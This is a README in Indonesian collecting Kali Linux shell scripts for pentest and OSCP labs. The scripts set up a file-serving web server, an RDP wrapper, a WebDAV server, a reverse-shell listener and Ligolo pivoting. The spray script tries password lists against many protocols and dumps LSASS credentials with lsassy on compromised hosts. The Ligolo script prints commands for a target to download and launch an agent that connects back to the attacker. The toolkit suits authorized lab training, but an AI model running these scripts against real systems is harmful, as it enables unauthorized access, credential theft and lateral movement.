# ⚙️ Custom Commands (Kali Linux)

Kumpulan shortcut untuk mempercepat workflow pentest / OSCP.

---

## 1. webserver

**Deskripsi:** HTTP server + auto generate wget & PowerShell (IWR)

### Setup
```bash
sudo nano /usr/local/bin/webserver
sudo chmod +x /usr/local/bin/webserver
```

### Script
```bash
#!/bin/bash

PORT=${1:-8000}

echo "[+] Starting web server on port $PORT..."
echo

FILES=$(ls -p | grep -v /)

echo "[+] Available download commands:"
echo

ip -4 -o addr show | awk '!/ lo / {
    split($4,a,"/");
    print $2 " (" a[1] "):"
}' | while read line; do

    IFACE=$(echo $line | awk '{print $1}')
    IP=$(echo $line | awk -F'[()]' '{print $2}')

    echo "$IFACE:"
    
    for f in $FILES; do
        echo "  wget http://$IP:$PORT/$f"
        echo "  iwr -uri http://$IP:$PORT/$f -Outfile $f"
    done

    echo
done

echo "[+] Serving files from: $(pwd)"
echo "----------------------------------------"

python3 -m http.server "$PORT" --bind 0.0.0.0
```

### Usage
```bash
webserver 80
```

---

## 2. rdp

**Deskripsi:** Shortcut cepat untuk koneksi RDP (xfreerdp)

### Setup
```bash
sudo nano /usr/local/bin/rdp
sudo chmod +x /usr/local/bin/rdp
```

### Script
```bash
#!/bin/bash

IP=$1
USER=${2:-Administrator}
PASS=$3

if [ -z "$IP" ]; then
    echo "Usage: rdp <ip> [user] [pass]"
    exit 1
fi

if [ -z "$PASS" ]; then
    read -s -p "Password: " PASS
    echo
fi

xfreerdp /v:$IP /u:$USER /p:"$PASS" /dynamic-resolution /cert:ignore +clipboard /timeout:5000 || echo "[!] Connection failed"
```

### Usage
```bash
rdp 192.168.50.250
rdp 192.168.50.250 offsec lab
```

### Info
- Default user: `Administrator`
- Password hidden saat input
- Clipboard aktif
- Cert: ignore (lab friendly)

---

## 3. spray

**Deskripsi:** Shortcut cepat untuk spray user password ke list target (net exec / nxc)

### Setup
```bash
sudo nano /usr/local/bin/spray
sudo chmod +x /usr/local/bin/spray
```

### Script
```bash
#!/bin/bash

# ===============================
# spray v5 - Domain + Local Auth Support
# ===============================

TARGET_FILE=${1:-target}
USER_FILE=${2:-user}
PASS_FILE=${3:-pass}
AUTH_MODE=${4:-domain}   # domain | local

OUTDIR="spray_netexec"
RAW_OUT="$OUTDIR/raw_spray.txt"
CLEAN_OUT="$OUTDIR/clean_spray.txt"
SMB_OUT="$OUTDIR/smb_spray.txt"

THREADS=1
PROTOCOLS=("smb" "rdp" "wmi" "winrm" "mssql" "ssh" "ftp" "vnc" "nfs" "ldap")

# ===============================
# HELP
# ===============================
if [[ "$1" == "-h" || "$1" == "--help" ]]; then
    echo "spray v5 - Domain & Local auth supported"
    echo
    echo "Usage:"
    echo "  spray [target] [user] [pass] [mode]"
    echo
    echo "Mode:"
    echo "  domain (default)"
    echo "  local"
    exit 0
fi

# ===============================
# DEP CHECK
# ===============================
command -v nxc >/dev/null || { echo "[!] nxc not found"; exit 1; }

# ===============================
# FILE CHECK
# ===============================
for f in "$TARGET_FILE" "$USER_FILE" "$PASS_FILE"; do
    [ -f "$f" ] || { echo "[!] Missing file: $f"; exit 1; }
done

# ===============================
# AUTH MODE
# ===============================
if [[ "$AUTH_MODE" == "local" ]]; then
    AUTH_FLAG="--local-auth"
else
    AUTH_FLAG=""
fi

# ===============================
# INIT OUTPUT
# ===============================
mkdir -p "$OUTDIR"
> "$RAW_OUT"
> "$CLEAN_OUT"
> "$SMB_OUT"

TARGETS=$(tr '\n' ' ' < "$TARGET_FILE")

echo "[+] Mode    : $AUTH_MODE"
echo "[+] Targets : $TARGET_FILE"
echo "[+] Users   : $USER_FILE"
echo "[+] Password: $PASS_FILE"
echo

# ===============================
# SPRAY LOOP
# ===============================
for proto in "${PROTOCOLS[@]}"; do
    echo "========================================"
    echo "[+] Trying protocol: $proto"
    echo "========================================"

    TMP_OUT=$(mktemp)

    nxc $proto $TARGETS \
        -u "$USER_FILE" \
        -p "$PASS_FILE" \
        $AUTH_FLAG \
        --threads $THREADS \
        --continue-on-success \
        --no-progress 2>/dev/null | tee "$TMP_OUT"

    cat "$TMP_OUT" >> "$RAW_OUT"
    grep -i "\[+\]" "$TMP_OUT" >> "$CLEAN_OUT"

    # Lockout protection
    if grep -q "STATUS_ACCOUNT_LOCKED_OUT" "$TMP_OUT"; then
        echo "[!] Lockout detected! Stopping..."
        rm -f "$TMP_OUT"
        exit 1
    fi

    # ===============================
    # SMB ENUM
    # ===============================
    if [[ "$proto" == "smb" ]]; then
        echo "[+] Checking valid SMB creds..."

        grep -i "\[+\]" "$TMP_OUT" | while read -r line; do

        IP=$(echo "$line" | awk '{print $2}')
        CREDS=$(echo "$line" | grep -oP '(?<=\[\+\] ).*')

        USER_PART=$(echo "$CREDS" | awk -F':' '{print $1}')
        PASS=$(echo "$CREDS" | awk -F':' '{print $2}')

        if [[ "$USER_PART" == *\\* ]]; then
            DOMAIN=$(echo "$USER_PART" | awk -F'\\' '{print $1}')
            USER=$(echo "$USER_PART" | awk -F'\\' '{print $2}')
        else
            DOMAIN=""
            USER="$USER_PART"
        fi

        if [[ -z "$USER" || -z "$PASS" ]]; then
            echo "[!] Parse failed: $line"
            continue
        fi

        echo "[+] SMB ENUM: $IP | $USER:$PASS"

        if [[ "$AUTH_MODE" == "local" ]]; then
            OUT=$(nxc smb "$IP" -u "$USER" -p "$PASS" --local-auth --shares --threads 1 --no-progress 2>/dev/null)
        elif [[ -n "$DOMAIN" ]]; then
            OUT=$(nxc smb "$IP" -u "$USER" -p "$PASS" -d "$DOMAIN" --shares --threads 1 --no-progress 2>/dev/null)
        else
            OUT=$(nxc smb "$IP" -u "$USER" -p "$PASS" --shares --threads 1 --no-progress 2>/dev/null)
        fi
        
        echo "$OUT" | tee -a "$SMB_OUT"
        
        # cek apakah login sukses
        if echo "$OUT" | grep -q "Pwn3d!"; then
            echo "[+] SMB compromised, running lsassy..." | tee -a "$SMB_OUT"
        
            if [[ "$AUTH_MODE" == "local" ]]; then
                nxc smb "$IP" -u "$USER" -p "$PASS" --local-auth -M lsassy --no-progress 2>/dev/null | tee -a "$SMB_OUT"
            elif [[ -n "$DOMAIN" ]]; then
                nxc smb "$IP" -u "$USER" -p "$PASS" -d "$DOMAIN" -M lsassy --no-progress 2>/dev/null | tee -a "$SMB_OUT"
            else
                nxc smb "$IP" -u "$USER" -p "$PASS" -M lsassy --no-progress 2>/dev/null | tee -a "$SMB_OUT"
            fi
        fi

        done
    fi

    rm -f "$TMP_OUT"
    echo
done

echo "[+] Done!"
echo "[+] Raw   : $RAW_OUT"
echo "[+] Clean : $CLEAN_OUT"
echo "[+] SMB   : $SMB_OUT"
```

### Usage
```bash
spray
spray listip user.txt pass.txt
```

### Info
- Default if running without parameter spray = spray target user pass

---

## 4. webdav

**Deskripsi:** Shortcut cepat untuk running webdav (wsgidav)

### Setup
```bash
sudo nano /usr/local/bin/webdav
sudo chmod +x /usr/local/bin/webdav
```

### Script
```bash
#!/bin/bash

# Default values
DIR="/tmp/wsgidav"
PORT="80"

# Help menu
if [[ "$1" == "-h" || "$1" == "--help" ]]; then
    echo "Usage: webdav [directory] [port]"
    echo ""
    echo "Examples:"
    echo "  webdav                     # default /tmp/wsgidav port 80"
    echo "  webdav /tmp/share          # custom directory"
    echo "  webdav /tmp/share 8080     # custom directory + port"
    exit 0
fi

# Arguments
[[ -n "$1" ]] && DIR="$1"
[[ -n "$2" ]] && PORT="$2"

# Create directory if not exists
if [[ ! -d "$DIR" ]]; then
    echo "[+] Creating directory: $DIR"
    mkdir -p "$DIR"
fi

# Get IP
IP=$(hostname -I | awk '{print $1}')

# Banner
echo "[+] WebDAV Server Starting"
echo "[+] Root : $DIR"
echo "[+] Port : $PORT"
echo "[+] URL  : http://$IP:$PORT/"
echo ""

# Run WebDAV
wsgidav --host=0.0.0.0 --port="$PORT" --root="$DIR" --auth=anonymous


```

### Usage
```bash
webdav (Default /tmp/webdav port 80)
webdav /home/kali/share 8080 (Custom folder + port)
```

---


## 5. Reverse shell

**Deskripsi:** Shortcut cepat untuk running nc -lnvp + session log + rlwrap

### Setup
```bash
sudo nano /usr/local/bin/revshell
sudo chmod +x /usr/local/bin/revshell
```

### Script
```bash
#!/bin/bash

PORT=${1:-4444}
LOG="session_${PORT}_$(date +%F_%H-%M-%S).log"

echo "[+] Reverse shell listener"
echo "[+] Port : $PORT"
echo "[+] Log  : $LOG"
echo ""

script -f "$LOG" -c "rlwrap nc -lnvp $PORT"
```

### Usage
```bash
rev (default port 4444)
rev 1234
rev 8000
rev 9001
```

---

## 6. Ligolo-auto

**Deskripsi:** Shortcut cepat untuk running ligolo + create tun interface untuk pivoting + running webserver di folder yang telah ditentukan.

### Setup
```bash
sudo nano /usr/local/bin/ligolo-auto
sudo chmod +x /usr/local/bin/ligolo-auto
```

### Script
```bash
#!/bin/bash

LIGOLO_DIR="/opt/postexploitation/ligolo"
PORT=11601
WEBPORT=8000
IFACE="ligolo"

# =========================
# DETECT IP
# =========================
IP=$(ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
[ -z "$IP" ] && IP=$(hostname -I | awk '{print $1}')

echo "[+] Attacker IP : $IP"
echo ""

# =========================
# SETUP TUN (AUTO)
# =========================
echo "[+] Preparing TUN interface..."

if ip link show $IFACE >/dev/null 2>&1; then
    echo "[*] TUN already exists, reusing..."
else
    sudo ip tuntap add user $(whoami) mode tun $IFACE
    sudo ip link set $IFACE up
    echo "[+] TUN created: $IFACE"
fi

echo ""

# =========================
# START WEBSERVER
# =========================
if [ -f "$LIGOLO_DIR/agent.exe" ]; then
    echo "[+] Starting webserver on :$WEBPORT"
    (cd "$LIGOLO_DIR" && python3 -m http.server $WEBPORT >/dev/null 2>&1 &)
else
    echo "[!] agent.exe not found!"
fi

# =========================
# TARGET COMMAND
# =========================
CMD1="iwr http://$IP:$WEBPORT/agent.exe -OutFile agent.exe"
CMD2="Start-Process .\\agent.exe -ArgumentList '-connect $IP:$PORT -ignore-cert'"

echo "[+] Run on target:"
echo "--------------------------------"
echo "$CMD1"
echo "$CMD2"
echo "--------------------------------"

# =========================
# START PROXY
# =========================
echo ""
echo "[*] Starting Ligolo..."
cd "$LIGOLO_DIR" || exit
./proxy -selfcert
                 
```

### Usage
```bash
ligolo-auto
```

## 7. Ligolo-route

**Deskripsi:** Shortcut cepat untuk nambah routing untuk pivoting menggunakan ligolo.

### Setup
```bash
sudo nano /usr/local/bin/ligolo-route
sudo chmod +x /usr/local/bin/ligolo-route
```

### Script
```bash
#!/bin/bash

IFACE="ligolo"

if [ -z "$1" ]; then
    echo "Usage: ligolo-route <subnet>"
    exit 1
fi

echo "[+] Adding route $1 via $IFACE"
sudo ip route add $1 dev $IFACE
                 
```

### Usage
```bash
ligolo-route 172.16.6.0/24
```
